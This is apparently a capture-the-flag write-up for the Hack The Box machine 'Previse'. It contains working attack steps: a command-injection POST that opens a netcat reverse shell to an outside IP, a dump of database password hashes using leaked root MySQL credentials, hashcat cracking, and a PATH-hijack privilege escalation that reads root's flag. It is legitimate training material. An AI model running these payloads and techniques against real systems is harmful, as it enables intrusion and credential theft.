> Author: **[m4lwhere][author-profile]**

## Discovery

Alright, let's get start with nmap and gobuster:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
```

```bash
gobuster dir -u 10.10.11.104 -w /usr/share/wordlists/discovery/raft-small-directories.txt -x php
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.104/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.104/js/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/login.php            (Status: 200) [Size: 2224]
/download.php         (Status: 302) [Size: 0] [--> login.php]
/files.php            (Status: 302) [Size: 6072] [--> login.php]
/logs.php             (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/index.php            (Status: 302) [Size: 2801] [--> login.php]
/accounts.php         (Status: 302) [Size: 3994] [--> login.php]
/nav.php              (Status: 200) [Size: 1248]
/header.php           (Status: 200) [Size: 980]
/footer.php           (Status: 200) [Size: 217]
/status.php           (Status: 302) [Size: 2970] [--> login.php]
/server-status        (Status: 403) [Size: 277]
```

Browsing the website leads to a login page. Since it is hardened agains SQLi
(Sqlmap fails too) and we have no clues yet, we need to find another way in.

Going over all the discovered pages, they all redirect to `login.php` except
`config.php` and `accounts.php`.

Actually Burpsuite captures a response body on `accounts.php`, before jumping
to the login page.

This page allows to create a new account, there's a html form for user input.
We can directly send a POST request with the matching parameters:

```bash
curl -i -s -k -X $'POST' --compressed \
    -H $'Host: 10.10.11.104' \
    -H $'Content-Type: application/x-www-form-urlencoded' \
    -H $'Accept-Encoding: gzip, deflate' \
    -b $'PHPSESSID=as7pqom59hgv01jml1bnapfvap' \
    --data-binary $'username=heyhey&password=lolololololo&confirm=lolololololo' \
    $'http://10.10.11.104/accounts.php'
```

Which creates a new user: we can now log on the webpage.

## Break-in

Once logged in, the "files" tab immediately draws attention:

- there's a "siteBackup.zip", which can be downloaded
- it is possible to upload files
- the file IDs are sequential: `http://10.10.11.104/download.php?file=32`

While it is tempting to upload a reverse shell, it would end-up stored in
the database, which prevents us to browse / execute it.

Rather, the backup contains the PHP source files of the site, full of informations!

Most interesting is `logs.php`: it uses exec to launch a python script with
user input as argument!

```php
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
```

Normally the logs page is queried by `file_logs.php` via POST. Using Burpsuite,
we can submit the form and capture the request.

Then we inject a reverse shell in the POST parameter:

```bash
curl -i -s -k -X $'POST' --compressed \
    -H $'Host: 10.10.11.104' \
    -H $'Content-Type: application/x-www-form-urlencoded' \
    -H $'Accept-Encoding: gzip, deflate' \
    -b $'PHPSESSID=as7pqom59hgv01jml1bnapfvap' \
    --data-binary $'delim=;nc 10.10.16.30 9876 -e /bin/bash' \
    $'http://10.10.11.104/logs.php'
```

Spawn a TTY:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

We have a proper shell, as "www-data".

## Lateral movement

As www-data, we can browse the current site's source files and database.

Indeed, the backup has the database credentials in `config.php`:

```php
$host = 'localhost';
$user = 'root';
$passwd = 'mySQL_p@ssw0rd!:)';
$db = 'previse';
```

Which can be used with the client:

```bash
mysql -D'previse' -u'root' -p'mySQL_p@ssw0rd!:)' -e'show tables;'
mysql -D'previse' -u'root' -p'mySQL_p@ssw0rd!:)' -e'show columns from accounts;'
mysql -D'previse' -u'root' -p'mySQL_p@ssw0rd!:)' -e'select username,password from accounts;'
```

To find:

```
+----------+------------------------------------+
| username | password                           |
+----------+------------------------------------+
| m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. |
| heyhey   | $1$🧂llol$QeuLTO6nKr3dEF2IutDLL0 |
+----------+------------------------------------+

```

`accounts.php` is in charge of creating new users and hashing their password:

```php
$hash = crypt($password, '$1$🧂llol$');
```

The PHP documentation says that a salt starting with "$1" returns a MD5 hash.
The corresponding code in Hashcat is 500:

```bash
# $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
hashcat -a 0 -m 500 m4lwhere.hash /usr/share/wordlists/passwords/rockyou.txt
```

These credentials allow to connect as "m4lwhere" via ssh.

## Escalation

m4lwhere can execute `/opt/scripts/access_backup.sh` with root privileges. In
turn, it executes the following commands:

```bash
gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

Here, we can alter the `$PATH` variable and point to a malicious date binary:

```bash
echo $'head -n1 /root/root.txt' > /tmp/date
chmod +x /tmp/date
PATH=/tmp:$PATH sudo /opt/scripts/access_backup.sh
ls -lah /var/backups/
```

The backup files are named after the root flag!

[author-profile]: https://app.hackthebox.eu/users/107145
